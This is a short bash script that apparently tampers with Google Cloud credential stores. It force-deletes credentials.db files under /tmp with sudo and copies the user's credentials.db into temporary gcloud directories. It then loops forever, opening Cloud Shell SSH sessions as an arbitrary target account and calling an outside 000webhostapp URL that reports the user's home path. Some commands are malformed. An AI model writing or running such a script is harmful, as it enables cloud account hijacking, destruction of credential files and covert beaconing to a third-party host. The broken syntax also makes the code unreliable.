#!/bin/bash

target=$1

sudo rm -rf echo /tmp/tmp*/credentials.db | xargs -n 1

gcloud info

echo /tmp/tmp*/ | xargs -n 1 cp -v $HOME/credentials.db

gcloud auth list

while true
do
gcloud cloud-shell ssh --command="date >> ping" --authorize-session --force-key-file-overwrite --account=$target
curl https://g11977765505.000webhostapp.com/ping.php?user=$HOME
sleep 60
done
